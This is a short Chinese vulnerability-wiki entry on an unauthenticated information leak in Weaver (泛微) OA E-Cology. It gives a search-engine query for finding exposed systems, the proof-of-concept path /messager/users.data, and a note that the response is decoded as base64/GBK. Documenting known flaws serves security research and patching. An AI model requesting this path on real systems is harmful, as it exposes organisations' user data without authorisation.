---
title: "泛微OA E-Cology users.data 敏感信息泄漏"
date: 2026-10-17 09:12:31
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

泛微OA E-Cology users.data 允许任意用户下载，获取OA中的敏感信息

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同商务系统"
```

## 漏洞复现

登录页面

![image-20220520134158756](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201341810.png)

验证POC

```
/messager/users.data
```

![image-20220520134209598](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201342693.png)

base64 GBK解码

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.md)
